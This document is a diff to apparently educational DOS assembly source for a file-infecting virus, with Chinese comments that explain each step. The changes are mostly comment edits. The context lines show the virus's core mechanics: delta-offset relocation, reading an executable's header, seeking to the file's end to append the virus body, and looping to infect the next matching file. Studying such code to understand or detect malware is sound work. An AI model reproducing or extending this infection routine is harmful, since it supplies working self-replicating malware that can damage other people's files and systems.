@@ -14,13 +14,13 @@ code segment
               mov  ah,4ch
               int  21h
     source:   
-              mov  ax,4200h                    ;到文件头
-              xor  cx,cx
+              mov  ax,4200h                    ;移动指针到文件头
+              xor  cx,cx                       ;位移为0
               xor  dx,dx
               int  21h
 
               mov  ah,3fh                      ;读文件头
-              mov  cx,30h
+              mov  cx,30h                      ;读取的字节数
               lea  dx,[bp+offset head]
               mov  si,dx
               int  21h
@@ -33,9 +33,8 @@ code segment
 virus proc
               call locate
     locate:   
-
               pop  bp                          ;call指令压入了locate的IP , bp=offset locate
-              sub  bp,offset locate            ;相对locate寻址,bp=0
+              sub  bp,offset locate            ;bp=0
               lea  dx,[bp+offset string]       ;输出字符串
               mov  ah,09h
               int  21h
@@ -120,11 +119,12 @@ virus proc
               mov  word ptr [si+4],ax
     
               mov  ax,4200h                    ;42号功能，AL=方式0-正向1-相对2-反向
-    ;移动指针到文件尾，病毒代码插入到尾部
-    ;返回：CF=0成功,DX:AX=新的文件指针
-              xor  cx,cx
+                                                ;移动指针到文件尾，病毒代码插入到尾部
+                                                ;返回：CF=0成功,DX:AX=新的文件指针
+              xor  cx,cx                        ; 位移为0
               xor  dx,dx
               int  21h
+
               mov  ah,40h
               mov  dx,si
               mov  cx,30h
@@ -135,7 +135,7 @@ virus proc
               int  21h
 
               mov  ah,4fh                      ;查找下一个文件
-    ;返回CF=1失败,AX=错误码
+                                                ;返回CF=1失败,AX=错误码
               int  21h
               jc   Exit
               jmp  modify
